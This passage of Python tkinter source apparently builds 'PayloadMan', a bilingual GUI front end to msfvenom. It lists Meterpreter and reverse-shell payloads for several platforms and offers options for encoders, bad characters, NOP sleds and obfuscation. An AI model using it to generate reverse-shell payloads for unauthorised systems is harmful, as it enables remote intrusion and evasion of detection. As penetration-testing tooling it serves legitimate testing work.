        if 'windows' in payload_lower:
            return 'windows'
        elif 'linux' in payload_lower:
            return 'linux'
        elif 'android' in payload_lower:
            return 'android'
        elif 'osx' in payload_lower or 'macos' in payload_lower:
            return 'osx'
        elif 'php' in payload_lower or 'asp' in payload_lower or 'jsp' in payload_lower:
            return 'web'
        elif 'java' in payload_lower:
            return 'multi'
        elif 'python' in payload_lower or 'perl' in payload_lower:
            return 'multi'
        else:
            return 'multi'
    
    def use_fallback_data(self):
        """Use fallback data when msfvenom is not available"""
        # Fallback formats
        self.formats = ['exe', 'dll', 'psh', 'vbs', 'elf', 'so', 'raw', 'c', 
                       'py', 'php', 'asp', 'jsp', 'war', 'jar', 'macho', 'apk']
        
        # Fallback payloads database
        self.payloads = {
            # Windows payloads
            'windows/meterpreter/reverse_tcp': {'platform': 'windows', 'description': 'Windows Meterpreter Reverse TCP'},
            'windows/x64/meterpreter/reverse_tcp': {'platform': 'windows', 'description': 'Windows x64 Meterpreter Reverse TCP'},
            
            # Linux payloads
            'linux/x86/shell_reverse_tcp': {'platform': 'linux', 'description': 'Linux x86 Shell Reverse TCP'},
            'linux/x64/shell_reverse_tcp': {'platform': 'linux', 'description': 'Linux x64 Shell Reverse TCP'},
            
            # Android payloads
            'android/meterpreter/reverse_tcp': {'platform': 'android', 'description': 'Android Meterpreter Reverse TCP'},
            
            # macOS payloads
            'osx/x64/shell_reverse_tcp': {'platform': 'osx', 'description': 'macOS x64 Shell Reverse TCP'},
            
            # Web payloads
            'php/meterpreter_reverse_tcp': {'platform': 'web', 'description': 'PHP Meterpreter Reverse TCP'},
            'java/meterpreter/reverse_tcp': {'platform': 'multi', 'description': 'Java Meterpreter Reverse TCP'},
        }
    
    def is_valid_payload(self, payload):
        """Check if payload exists in cache"""
        return payload in self.payloads
    
    def is_valid_format(self, format_name):
        """Check if format exists in cache"""
        return format_name in self.formats
    
    def get_platform_formats(self, platform):
        """Get valid formats for a platform"""
        # Platform-specific format mappings
        platform_formats = {
            'windows': ['exe', 'dll', 'psh', 'vbs', 'raw', 'c'],
            'linux': ['elf', 'so', 'raw', 'c', 'py'],
            'android': ['raw'],  # Android ONLY allows raw
            'osx': ['macho', 'raw', 'c'],
            'web': ['php', 'asp', 'jsp', 'war', 'raw'],
            'multi': ['jar', 'raw', 'c', 'py', 'psh']
        }
        return platform_formats.get(platform, ['raw'])
    
    def is_platform_format_valid(self, platform, format_name):
        """Check if format is valid for platform"""
        valid_formats = self.get_platform_formats(platform)
        return format_name in valid_formats

# ============================================================================
# IMPROVED MAIN CLASS WITH RESPONSIVE LAYOUT
# ============================================================================

class PayloadManGUI:
    def __init__(self, root, language='es'):
        self.root = root
        self.translator = Translator(language)
        self.cache = MsfvenomCache()
        
        try:
            self.cache.load_cache()
        except Exception as e:
            print(f"Cache initialization error: {e}")
            self.cache.use_fallback_data()
        
        self.root.title(self.translator.t('app_title'))
        # Ventana redimensionable con tamaño mínimo
        self.root.geometry("1280x720")
        self.root.minsize(1024, 600)
        self.root.resizable(True, True)
        
        self.setup_theme()
        
        # Main variables
        self.platform_var = tk.StringVar(value="windows")
        self.payload_var = tk.StringVar()
        self.ip_var = tk.StringVar()
        self.port_var = tk.StringVar(value="4444")
        self.format_var = tk.StringVar(value="exe")
        self.output_var = tk.StringVar(value=f"payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        self.outdir_var = tk.StringVar(value=os.getcwd())
        
        # Advanced variables
        self.encoder_var = tk.StringVar(value="none")
        self.iterations_var = tk.StringVar(value="1")
        self.badchars_var = tk.StringVar(value="\\x00")
        self.nop_var = tk.StringVar(value="0")
        self.prepend_var = tk.StringVar(value="")
        self.append_var = tk.StringVar(value="")
        self.arch_var = tk.StringVar(value="x86")
        
        # Additional variables
        self.ip_warning_var = tk.StringVar()
        self.verbose_var = tk.BooleanVar(value=True)
        self.keep_var = tk.BooleanVar(value=False)
        self.custom_opts_var = tk.StringVar()
        
        # Validation flags
        self.android_warning_shown = False
        
        # Dictionary to store format widgets
        self.format_buttons = {}
        
        self.build_ui()
        self.update_payloads()
        self.update_formats()  # Initialize formats by platform
        self.ip_var.trace("w", self.validate_ip)
        
        # Configure keyboard shortcuts
        self.root.bind('<F1>', self.show_general_help)
        self.root.bind('<Control-g>', lambda e: self.generate_all())
        self.root.bind('<Control-q>', lambda e: self.root.quit())
        
        # Center window on screen
        self.center_window()

    def center_window(self):
        """Center window on screen"""
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')

    def setup_theme(self):
        self.colors = {
            'background': '#0a0f1a',
            'card_bg': '#162233',
            'card_bg_dark': '#0f1729',
            'text': '#e5e7eb',
            'text_muted': '#94a3b8',
            'primary': '#336699',
            'primary_hover': '#3d7bb3',
            'primary_soft': '#2a4f73',
            'warning': '#f59e0b',
            'success': '#10b981',
            'danger': '#ef4444',
            'border': '#1e293b',
            'disabled': '#4b5563'
        }
        self.root.configure(bg=self.colors['background'])
        
        # Configure ttk style
        style = ttk.Style()
        style.theme_use("clam")
        
        # Configure ttk colors
        style.configure("TNotebook", background=self.colors['background'], borderwidth=0)
        style.configure("TNotebook.Tab", background=self.colors['card_bg'], 
                       foreground=self.colors['text'], padding=[10, 5])
        style.map("TNotebook.Tab", background=[("selected", self.colors['primary'])],
                  foreground=[("selected", "white")])
        
        style.configure("Vertical.TScrollbar", background=self.colors['primary_soft'],
                       troughcolor=self.colors['card_bg_dark'])
        style.configure("Horizontal.TScrollbar", background=self.colors['primary_soft'],
                       troughcolor=self.colors['card_bg_dark'])

    def build_ui(self):
        # Configurar grid para la ventana principal
        self.root.rowconfigure(0, weight=1)
        self.root.columnconfigure(0, weight=1)
        
        # Main frame que ocupa todo el espacio
        main_frame = tk.Frame(self.root, bg=self.colors['background'])
        main_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=5)
        main_frame.rowconfigure(1, weight=1)  # Fila del notebook se expande
        main_frame.columnconfigure(0, weight=1)
        
        # Header - NO se expande verticalmente
        header = tk.Frame(main_frame, bg=self.colors['primary'])
        header.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        header.columnconfigure(0, weight=1)
        
        tk.Label(header, text=self.translator.t('app_title'), 
                bg=self.colors['primary'], fg="white", 
                font=("Helvetica", 20, "bold")).grid(row=0, column=0, sticky="w", padx=20, pady=(10, 5))
        
        tk.Label(header, text=self.translator.t('subtitle'), 
                bg=self.colors['primary'], fg="#d1d5db", 
                font=("Helvetica", 9)).grid(row=1, column=0, sticky="w", padx=20, pady=(0, 10))
        
        # Language selector
        lang_frame = tk.Frame(header, bg=self.colors['primary'])
        lang_frame.grid(row=2, column=0, sticky="w", padx=20, pady=(0, 10))
        
        tk.Label(lang_frame, text=f"{self.translator.t('language')}: ", 
                bg=self.colors['primary'], fg="white").grid(row=0, column=0, sticky="w")
        
        self.lang_var = tk.StringVar(value=self.translator.language)
        
        def change_language():
            current_lang = self.translator.language
            new_lang = self.lang_var.get()
            
            if current_lang != new_lang:
                response = messagebox.askyesno(
                    self.translator.t('restart_required'),
                    self.translator.t('restart_message'),
                    parent=self.root
                )
                if response:
                    self.translator.set_language(new_lang)
                    self.root.destroy()
                    # Restart application
                    python = sys.executable
                    os.execl(python, python, *sys.argv)
                else:
                    # Revert to previous language
                    self.lang_var.set(current_lang)
        
        tk.Radiobutton(lang_frame, text=self.translator.t('spanish'), value="es", 
                      variable=self.lang_var, command=change_language,
                      bg=self.colors['primary'], fg="white", 
                      selectcolor=self.colors['primary_soft']).grid(row=0, column=1, padx=5)
        
        tk.Radiobutton(lang_frame, text=self.translator.t('english'), value="en", 
                      variable=self.lang_var, command=change_language,
                      bg=self.colors['primary'], fg="white", 
                      selectcolor=self.colors['primary_soft']).grid(row=0, column=2, padx=5)
        
        # Notebook (tabs) - Se expande completamente
        nb = ttk.Notebook(main_frame)
        nb.grid(row=1, column=0, sticky="nsew", padx=5, pady=5)
        
        # Create tabs
        self.tab_basic = tk.Frame(nb, bg=self.colors['background'])
        self.tab_adv = tk.Frame(nb, bg=self.colors['background'])
        self.tab_obf = tk.Frame(nb, bg=self.colors['background'])
        self.tab_gen = tk.Frame(nb, bg=self.colors['background'])
        self.tab_extra = tk.Frame(nb, bg=self.colors['background'])
        self.tab_about = tk.Frame(nb, bg=self.colors['background'])
        
        nb.add(self.tab_basic, text=self.translator.t('tab_basic'))
        nb.add(self.tab_adv, text=self.translator.t('tab_advanced'))
        nb.add(self.tab_obf, text=self.translator.t('tab_obfuscation'))
        nb.add(self.tab_extra, text=self.translator.t('tab_extra'))
        nb.add(self.tab_gen, text=self.translator.t('tab_generate'))
        nb.add(self.tab_about, text=self.translator.t('tab_about'))
        
        # Configurar expansión de cada tab
        for tab in [self.tab_basic, self.tab_adv, self.tab_obf, self.tab_gen, self.tab_extra, self.tab_about]:
            tab.rowconfigure(0, weight=1)
            tab.columnconfigure(0, weight=1)
        
        self.build_basic_tab(self.tab_basic)
        self.build_adv_tab(self.tab_adv)
        self.build_obf_tab(self.tab_obf)
        self.build_extra_tab(self.tab_extra)
        self.build_generate_tab(self.tab_gen)
        self.build_about_tab(self.tab_about)
        
        # Status bar - NO se expande verticalmente
        status = tk.Frame(main_frame, bg=self.colors['card_bg_dark'], height=25)
        status.grid(row=2, column=0, sticky="ew", pady=(5, 0))
        status.columnconfigure(0, weight=1)
        
        self.status_label = tk.Label(status, text=self.translator.t('footer_disclaimer'), 
                                    bg=self.colors['card_bg_dark'], 
                                    fg=self.colors['text_muted'], font=("Helvetica", 9))
        self.status_label.grid(row=0, column=0, sticky="w", padx=10)

    def build_about_tab(self, parent):
        """Build the About tab with author info and disclaimer"""
        # Contenedor principal con grid
        container = tk.Frame(parent, bg=self.colors['background'])
        container.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        container.columnconfigure(0, weight=1)
        container.rowconfigure(1, weight=1)  # Fila del contenido se expande
        
        # Title
        title = tk.Label(container, text=self.translator.t('about_title'),
                        bg=self.colors['background'], fg=self.colors['text'],
                        font=("Helvetica", 16, "bold"))
        title.grid(row=0, column=0, sticky="w", pady=(10, 10))
        
        # Content frame con scrollbar
        content_frame = tk.Frame(container, bg=self.colors['background'])
        content_frame.grid(row=1, column=0, sticky="nsew")
        content_frame.rowconfigure(0, weight=1)
        content_frame.columnconfigure(0, weight=1)
        
        # Canvas con scrollbar vertical
        canvas = tk.Canvas(content_frame, bg=self.colors['background'], highlightthickness=0)
        scrollbar = ttk.Scrollbar(content_frame, orient="vertical", command=canvas.yview)
        
        scrollable_frame = tk.Frame(canvas, bg=self.colors['background'])
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        # Grid para canvas y scrollbar
        canvas.grid(row=0, column=0, sticky="nsew")
        scrollbar.grid(row=0, column=1, sticky="ns")
        
        content_frame.columnconfigure(0, weight=1)
        content_frame.rowconfigure(0, weight=1)
        
        # Contenido dentro del scrollable_frame
        content = scrolledtext.ScrolledText(scrollable_frame, wrap="word",
                                           bg=self.colors['card_bg_dark'],
                                           fg=self.colors['text'],
                                           font=("Helvetica", 10),
                                           height=20)
        content.pack(fill="both", expand=True, padx=10, pady=10)
        content.insert("1.0", self.translator.t('about_content'))
        content.configure(state="disabled")
        
        # Button frame
        button_frame = tk.Frame(scrollable_frame, bg=self.colors['background'])
        button_frame.pack(pady=10)
        
        tk.Button(button_frame, text="Copiar información" if self.translator.language == 'es' else "Copy information",
                 command=lambda: self.copy_about_info(),
                 bg=self.colors['primary'], fg="white", padx=20).pack(side="left", padx=5)

    def copy_about_info(self):
        """Copy about information to clipboard"""
        about_text = self.translator.t('about_content')
        self.root.clipboard_clear()
        self.root.clipboard_append(about_text)
        self.update_status("Información copiada" if self.translator.language == 'es' else "Information copied")

    def build_basic_tab(self, parent):
        # Contenedor principal con grid que se expande
        container = tk.Frame(parent, bg=self.colors['background'])
        container.grid(row=0, column=0, sticky="nsew", padx=10, pady=5)
        
        # Configurar expansión
        container.rowconfigure(0, weight=1)
        container.columnconfigure(0, weight=3)  # Panel izquierdo 75%
        container.columnconfigure(1, weight=1)  # Panel derecho 25%
        
        # Left panel (configuration) - se expande completamente
        left_panel = tk.Frame(container, bg=self.colors['background'])
        left_panel.grid(row=0, column=0, sticky="nsew", padx=(0, 10), pady=5)
        left_panel.rowconfigure(0, weight=1)
        left_panel.columnconfigure(0, weight=1)
        
        # Right panel (preview) - se expande completamente
        right_panel = tk.Frame(container, bg=self.colors['background'])
        right_panel.grid(row=0, column=1, sticky="nsew", pady=5)
        right_panel.rowconfigure(0, weight=1)
        right_panel.columnconfigure(0, weight=1)
        
        # Basic configuration card - se expande en left_panel
        card = tk.LabelFrame(left_panel, text=self.translator.t('basic_config'), 
                            bg=self.colors['card_bg'], fg=self.colors['text'],
                            font=("Helvetica", 11, "bold"), padx=15, pady=15)
        card.grid(row=0, column=0, sticky="nsew")
        card.rowconfigure(0, weight=1)
        card.columnconfigure(0, weight=1)
        
        # Frame interno para organización grid
        card_inner = tk.Frame(card, bg=self.colors['card_bg'])
        card_inner.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        
        # Configurar grid interno
        for i in range(12):
            card_inner.rowconfigure(i, weight=0)
        card_inner.columnconfigure(0, weight=0)  # Labels
        card_inner.columnconfigure(1, weight=1)  # Entries/buttons
        card_inner.columnconfigure(2, weight=0)  # Warnings/extra
        
        row = 0
        
        # Platform selection
        tk.Label(card_inner, text=self.translator.t('platform'), bg=self.colors['card_bg'], 
                fg=self.colors['text'], font=("Helvetica", 10, "bold")).grid(
                row=row, column=0, sticky="w", padx=10, pady=5)
        
        platform_frame = tk.Frame(card_inner, bg=self.colors['card_bg'])
        platform_frame.grid(row=row, column=1, columnspan=2, sticky="w", pady=5)
        
        platforms = [
            ("Windows", "windows"),
            ("Linux", "linux"), 
            ("Android", "android"),
            ("macOS", "osx"),
            ("Web", "web"),
            ("Multi", "multi")
        ]
        
        for i, (name, value) in enumerate(platforms):
            rb = tk.Radiobutton(platform_frame, text=name, value=value, 
                               variable=self.platform_var, 
                               bg=self.colors['card_bg'], fg=self.colors['text'],
                               selectcolor=self.colors['primary_soft'],
                               command=self.on_platform_change,
                               font=("Helvetica", 9))
            rb.grid(row=0, column=i, padx=5)
        
        # Architecture - will be hidden/disabled for Android
        row += 1
        self.arch_label = tk.Label(card_inner, text=self.translator.t('architecture'), 
                                  bg=self.colors['card_bg'], fg=self.colors['text'], 
                                  font=("Helvetica", 10, "bold"))
        self.arch_label.grid(row=row, column=0, sticky="w", padx=10, pady=5)
        
        self.arch_frame = tk.Frame(card_inner, bg=self.colors['card_bg'])
        self.arch_frame.grid(row=row, column=1, sticky="w", pady=5)
        
        arches = [("x86", "x86"), ("x64", "x64")]
        self.arch_buttons = []
        for i, (name, value) in enumerate(arches):
            rb = tk.Radiobutton(self.arch_frame, text=name, value=value, 
                          variable=self.arch_var, bg=self.colors['card_bg'], 
                          fg=self.colors['text'], selectcolor=self.colors['primary_soft'],
                          command=self.on_architecture_change)
            rb.grid(row=0, column=i, padx=5)
            self.arch_buttons.append(rb)
        
        # Payload selection
        row += 1
        tk.Label(card_inner, text=self.translator.t('payload_type'), bg=self.colors['card_bg'], 
                fg=self.colors['text'], font=("Helvetica", 10, "bold")).grid(
                row=row, column=0, sticky="w", padx=10, pady=5)
        
        self.payload_frame = tk.Frame(card_inner, bg=self.colors['card_bg'])
        self.payload_frame.grid(row=row, column=1, columnspan=2, sticky="nsew", pady=5)
        self.payload_frame.columnconfigure(0, weight=1)
        
        # LHOST
        row += 1
        tk.Label(card_inner, text=self.translator.t('lhost'), bg=self.colors['card_bg'], 
                fg=self.colors['text'], font=("Helvetica", 10, "bold")).grid(
                row=row, column=0, sticky="w", padx=10, pady=5)
        
        ip_frame = tk.Frame(card_inner, bg=self.colors['card_bg'])
        ip_frame.grid(row=row, column=1, sticky="w", pady=5)
        
        tk.Entry(ip_frame, textvariable=self.ip_var, width=25,
                bg=self.colors['card_bg_dark'], fg=self.colors['text'],
                insertbackground=self.colors['text'], relief="flat").grid(row=0, column=0, padx=(0, 10))
        
        tk.Button(ip_frame, text=self.translator.t('detect_ip'), command=self.get_local_ip,
                 bg=self.colors['primary'], fg="white", padx=10).grid(row=0, column=1)
        
        tk.Label(card_inner, textvariable=self.ip_warning_var, 
                bg=self.colors['card_bg'], fg=self.colors['warning'],
                font=("Helvetica", 9)).grid(row=row, column=2, sticky="w", padx=10)
        
        # LPORT
        row += 1
        tk.Label(card_inner, text=self.translator.t('lport'), bg=self.colors['card_bg'], 
                fg=self.colors['text'], font=("Helvetica", 10, "bold")).grid(
                row=row, column=0, sticky="w", padx=10, pady=5)
        
        port_frame = tk.Frame(card_inner, bg=self.colors['card_bg'])
        port_frame.grid(row=row, column=1, sticky="w", pady=5)
        
        tk.Entry(port_frame, textvariable=self.port_var, width=15,
                bg=self.colors['card_bg_dark'], fg=self.colors['text'],
                insertbackground=self.colors['text'], relief="flat").grid(row=0, column=0)
        
        # Common ports buttons
        common_ports = [("80", "80"), ("443", "443"), ("8080", "8080"), ("53", "53")]
        
        for i, (text, port) in enumerate(common_ports):
            tk.Button(port_frame, text=text, command=lambda p=port: self.port_var.set(p),
                     bg=self.colors['primary_soft'], fg=self.colors['text'],
                     padx=5, font=("Helvetica", 8)).grid(row=0, column=i+1, padx=2)
        
        # Format
        row += 1
        tk.Label(card_inner, text=self.translator.t('output_format'), bg=self.colors['card_bg'], 
                fg=self.colors['text'], font=("Helvetica", 10, "bold")).grid(
                row=row, column=0, sticky="w", padx=10, pady=5)
        
        self.format_frame = tk.Frame(card_inner, bg=self.colors['card_bg'])
        self.format_frame.grid(row=row, column=1, sticky="w", pady=5)
        
        # Android warning label
        row += 1
        self.android_warning_label = tk.Label(card_inner, text="", 
                                            bg=self.colors['card_bg'], fg=self.colors['warning'],
                                            font=("Helvetica", 9, "italic"))
        self.android_warning_label.grid(row=row, column=1, columnspan=2, sticky="w", padx=10, pady=2)
        
        # Filename
        row += 1
        tk.Label(card_inner, text=self.translator.t('output_filename'), bg=self.colors['card_bg'], 
                fg=self.colors['text'], font=("Helvetica", 10, "bold")).grid(
                row=row, column=0, sticky="w", padx=10, pady=5)
        
        tk.Entry(card_inner, textvariable=self.output_var, width=30,
                bg=self.colors['card_bg_dark'], fg=self.colors['text'],
                insertbackground=self.colors['text'], relief="flat").grid(row=row, column=1, sticky="w", pady=5, padx=(0, 10))
        
        tk.Button(card_inner, text=self.translator.t('generate_name'), command=self.generate_filename,
                 bg=self.colors['primary_soft'], fg=self.colors['text'], padx=10).grid(row=row, column=2, sticky="w")
        
        # Output directory
        row += 1
        tk.Label(card_inner, text=self.translator.t('output_directory'), bg=self.colors['card_bg'], 
                fg=self.colors['text'], font=("Helvetica", 10, "bold")).grid(
                row=row, column=0, sticky="w", padx=10, pady=5)
        
        out_frame = tk.Frame(card_inner, bg=self.colors['card_bg'])
        out_frame.grid(row=row, column=1, columnspan=2, sticky="w", pady=5)
        
        tk.Entry(out_frame, textvariable=self.outdir_var, width=40,
                bg=self.colors['card_bg_dark'], fg=self.colors['text'],
                insertbackground=self.colors['text'], relief="flat").grid(row=0, column=0, padx=(0, 10))
        
        tk.Button(out_frame, text=self.translator.t('browse'), command=self.choose_dir,
                 bg=self.colors['primary'], fg="white", padx=15).grid(row=0, column=1)
        
        # Checkboxes
        row += 1
        options_frame = tk.Frame(card_inner, bg=self.colors['card_bg'])
        options_frame.grid(row=row, column=1, columnspan=2, sticky="w", pady=10)
        
        tk.Checkbutton(options_frame, text=self.translator.t('verbose_output'), variable=self.verbose_var,
                      bg=self.colors['card_bg'], fg=self.colors['text'],
                      selectcolor=self.colors['primary_soft']).grid(row=0, column=0, padx=20)
        
        tk.Checkbutton(options_frame, text=self.translator.t('keep_files'), variable=self.keep_var,
                      bg=self.colors['card_bg'], fg=self.colors['text'],
                      selectcolor=self.colors['primary_soft']).grid(row=0, column=1, padx=20)
        
        # Preview panel en right_panel
        preview_card = tk.LabelFrame(right_panel, text=self.translator.t('command_preview'), 
                                    bg=self.colors['card_bg_dark'], fg=self.colors['text'],
                                    font=("Helvetica", 11, "bold"), padx=15, pady=15)
        preview_card.grid(row=0, column=0, sticky="nsew")
        preview_card.rowconfigure(0, weight=1)
        preview_card.columnconfigure(0, weight=1)
        
        self.preview_text = scrolledtext.ScrolledText(preview_card, height=20,
                                                     bg="#0b1220", fg="#e5e7eb",
                                                     font=("Consolas", 9), wrap="word")
        self.preview_text.grid(row=0, column=0, sticky="nsew")
        self.preview_text.insert("1.0", self.translator.t('command_preview') + "...")
        self.preview_text.configure(state="disabled")
        
        # Update preview when variables change
        for var in [self.platform_var, self.payload_var, self.ip_var, self.port_var,
                   self.format_var, self.encoder_var, self.iterations_var]:
            var.trace("w", lambda *args: self.update_preview())

    def build_adv_tab(self, parent):
        # Contenedor principal con grid
        container = tk.Frame(parent, bg=self.colors['background'])
        container.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        container.rowconfigure(1, weight=1)  # Fila del contenido se expande
        container.columnconfigure(0, weight=1)
        
        # Encoder warning - NO se expande
        warning_frame = tk.Frame(container, bg=self.colors['warning'], height=30)
        warning_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        warning_frame.columnconfigure(0, weight=1)
        
        self.encoder_warning_label = tk.Label(warning_frame, 
                                            text=self.translator.t('encoder_warning'),
                                            bg=self.colors['warning'], fg="black",
                                            font=("Helvetica", 9))
        self.encoder_warning_label.grid(row=0, column=0, pady=5)
        
        # Frame para contenido con dos columnas
        content_frame = tk.Frame(container, bg=self.colors['background'])
        content_frame.grid(row=1, column=0, sticky="nsew")
        content_frame.rowconfigure(0, weight=1)
        content_frame.columnconfigure(0, weight=1)  # Columna izquierda
        content_frame.columnconfigure(1, weight=1)  # Columna derecha
        
        # Left column
        left = tk.Frame(content_frame, bg=self.colors['background'])
        left.grid(row=0, column=0, sticky="nsew", padx=(0, 5))
        left.rowconfigure(0, weight=1)  # Encoder card
        left.rowconfigure(1, weight=1)  # Badchar card
        left.columnconfigure(0, weight=1)
        
        # Right column
        right = tk.Frame(content_frame, bg=self.colors['background'])
        right.grid(row=0, column=1, sticky="nsew", padx=(5, 0))
        right.rowconfigure(0, weight=1)  # Memory card
        right.rowconfigure(1, weight=1)  # Extra card
        right.columnconfigure(0, weight=1)
        
        # Encoder options
        encoder_card = tk.LabelFrame(left, text=self.translator.t('encoder_options'), 
                                    bg=self.colors['card_bg'], fg=self.colors['text'],
                                    font=("Helvetica", 11, "bold"), padx=15, pady=15)
        encoder_card.grid(row=0, column=0, sticky="nsew", pady=(0, 10))
        encoder_card.rowconfigure(0, weight=0)
        encoder_card.rowconfigure(1, weight=0)
        encoder_card.columnconfigure(1, weight=1)  # Columna de entrada se expande
        
        row = 0
        tk.Label(encoder_card, text=self.translator.t('encoder'), bg=self.colors['card_bg'], 
                fg=self.colors['text'], font=("Helvetica", 10)).grid(
                row=row, column=0, sticky="w", padx=5, pady=5)
        
        encoder_control_frame = tk.Frame(encoder_card, bg=self.colors['card_bg'])
        encoder_control_frame.grid(row=row, column=1, sticky="w", padx=10, pady=5)
        
        self.encoder_entry = tk.Entry(encoder_control_frame, textvariable=self.encoder_var, width=30,
                bg=self.colors['card_bg_dark'], fg=self.colors['text'],
                insertbackground=self.colors['text'], relief="flat")
        self.encoder_entry.grid(row=0, column=0, padx=(0, 10))
        
        tk.Button(encoder_control_frame, text="?", width=2, 
                 command=lambda: show_help(self.translator.t('encoder'), self.translator.t('help_encoder'), self.root),
                 bg=self.colors['primary'], fg="white").grid(row=0, column=1)
        
        self.encoder_examples_frame = tk.Frame(encoder_card, bg=self.colors['card_bg'])
        self.encoder_examples_frame.grid(row=row, column=2, sticky="w", padx=10)
        
        # Iterations
        row += 1
        tk.Label(encoder_card, text=self.translator.t('iterations'), bg=self.colors['card_bg'], 
                fg=self.colors['text'], font=("Helvetica", 10)).grid(
                row=row, column=0, sticky="w", padx=5, pady=5)
        
        self.iterations_entry = tk.Entry(encoder_card, textvariable=self.iterations_var, width=10,
                bg=self.colors['card_bg_dark'], fg=self.colors['text'],
                insertbackground=self.colors['text'], relief="flat")
        self.iterations_entry.grid(row=row, column=1, sticky="w", padx=10, pady=5)
        
        tk.Button(encoder_card, text="?", width=2, 
                 command=lambda: show_help(self.translator.t('iterations'), self.translator.t('help_iterations'), self.root),
                 bg=self.colors['primary'], fg="white").grid(row=row, column=2, padx=5, pady=5)
        
        # Ahora que ambos widgets están creados, llamamos a update_encoder_examples
        self.update_encoder_examples()
        
        # Badchars
        badchar_card = tk.LabelFrame(left, text=self.translator.t('bad_chars'), 
                                    bg=self.colors['card_bg'], fg=self.colors['text'],
                                    font=("Helvetica", 11, "bold"), padx=15, pady=15)
        badchar_card.grid(row=1, column=0, sticky="nsew")
        badchar_card.rowconfigure(0, weight=0)
        badchar_card.columnconfigure(1, weight=1)
        
        row = 0
        tk.Label(badchar_card, text=self.translator.t('badchars'), bg=self.colors['card_bg'], 
                fg=self.colors['text'], font=("Helvetica", 10)).grid(
                row=row, column=0, sticky="w", padx=5, pady=5)
        
        badchars_frame = tk.Frame(badchar_card, bg=self.colors['card_bg'])
        badchars_frame.grid(row=row, column=1, sticky="w", padx=10, pady=5)
        
        tk.Entry(badchars_frame, textvariable=self.badchars_var, width=30,
                bg=self.colors['card_bg_dark'], fg=self.colors['text'],
                insertbackground=self.colors['text'], relief="flat").grid(row=0, column=0, padx=(0, 10))
        
        tk.Button(badchars_frame, text="?", width=2, 
                 command=lambda: show_help(self.translator.t('badchars'), self.translator.t('help_badchars'), self.root),
                 bg=self.colors['primary'], fg="white").grid(row=0, column=1)
        
        badchars_examples_frame = tk.Frame(badchar_card, bg=self.colors['card_bg'])
        badchars_examples_frame.grid(row=row, column=2, sticky="w", padx=10)
        
        common_badchars = [
            ("NULL", "\\x00"),
            ("No CR/LF", "\\x00\\x0a\\x0d"),
            ("Windows", "\\x00\\x0a\\x0d\\x20"),
        ]
        
        for i, (text, chars) in enumerate(common_badchars):
            tk.Button(badchars_examples_frame, text=text, 
                     command=lambda c=chars: self.badchars_var.set(c),
                     bg=self.colors['primary_soft'], fg=self.colors['text'],
                     font=("Helvetica", 8), padx=5).grid(row=0, column=i, padx=2)
        
        # Memory manipulation
        memory_card = tk.LabelFrame(right, text=self.translator.t('memory_manipulation'), 
                                   bg=self.colors['card_bg'], fg=self.colors['text'],
                                   font=("Helvetica", 11, "bold"), padx=15, pady=15)
        memory_card.grid(row=0, column=0, sticky="nsew", pady=(0, 10))
        memory_card.rowconfigure(0, weight=0)
        memory_card.rowconfigure(1, weight=0)
        memory_card.rowconfigure(2, weight=0)
        memory_card.columnconfigure(1, weight=1)
        
        row = 0
        tk.Label(memory_card, text=self.translator.t('nop_sled'), bg=self.colors['card_bg'], 
                fg=self.colors['text'], font=("Helvetica", 10)).grid(
                row=row, column=0, sticky="w", padx=5, pady=5)
        
        nop_frame = tk.Frame(memory_card, bg=self.colors['card_bg'])
        nop_frame.grid(row=row, column=1, sticky="w", padx=10, pady=5)
        
        tk.Entry(nop_frame, textvariable=self.nop_var, width=10,
                bg=self.colors['card_bg_dark'], fg=self.colors['text'],
                insertbackground=self.colors['text'], relief="flat").grid(row=0, column=0, padx=(0, 10))
        
        tk.Button(nop_frame, text="?", width=2, 
                 command=lambda: show_help(self.translator.t('nop_sled'), self.translator.t('help_nop'), self.root),
                 bg=self.colors['primary'], fg="white").grid(row=0, column=1)
        
        nop_examples_frame = tk.Frame(memory_card, bg=self.colors['card_bg'])
        nop_examples_frame.grid(row=row, column=2, sticky="w", padx=10)
        
        nop_examples = [("0", "0"), ("64", "64"), ("128", "128")]
        for i, (text, value) in enumerate(nop_examples):
            tk.Button(nop_examples_frame, text=text, 
                     command=lambda v=value: self.nop_var.set(v),
                     bg=self.colors['primary_soft'], fg=self.colors['text'],
                     font=("Helvetica", 8), padx=5).grid(row=0, column=i, padx=2)
        
        row += 1
        tk.Label(memory_card, text=self.translator.t('prepend'), bg=self.colors['card_bg'], 
                fg=self.colors['text'], font=("Helvetica", 10)).grid(
                row=row, column=0, sticky="w", padx=5, pady=5)
        
        tk.Entry(memory_card, textvariable=self.prepend_var, width=30,
                bg=self.colors['card_bg_dark'], fg=self.colors['text'],
                insertbackground=self.colors['text'], relief="flat").grid(row=row, column=1, columnspan=2, sticky="w", padx=10, pady=5)
        
        row += 1
        tk.Label(memory_card, text=self.translator.t('append'), bg=self.colors['card_bg'], 
                fg=self.colors['text'], font=("Helvetica", 10)).grid(
                row=row, column=0, sticky="w", padx=5, pady=5)
        
        tk.Entry(memory_card, textvariable=self.append_var, width=30,
                bg=self.colors['card_bg_dark'], fg=self.colors['text'],
                insertbackground=self.colors['text'], relief="flat").grid(row=row, column=1, columnspan=2, sticky="w", padx=10, pady=5)
        
        # Additional options
        extra_card = tk.LabelFrame(right, text=self.translator.t('additional_options'), 
                                  bg=self.colors['card_bg'], fg=self.colors['text'],
                                  font=("Helvetica", 11, "bold"), padx=15, pady=15)
        extra_card.grid(row=1, column=0, sticky="nsew")
        extra_card.rowconfigure(0, weight=0)
        extra_card.columnconfigure(1, weight=1)
        
        row = 0
        tk.Label(extra_card, text=self.translator.t('custom_options'), 
                bg=self.colors['card_bg'], fg=self.colors['text'],
                font=("Helvetica", 10)).grid(row=row, column=0, sticky="w", padx=5, pady=5)
        
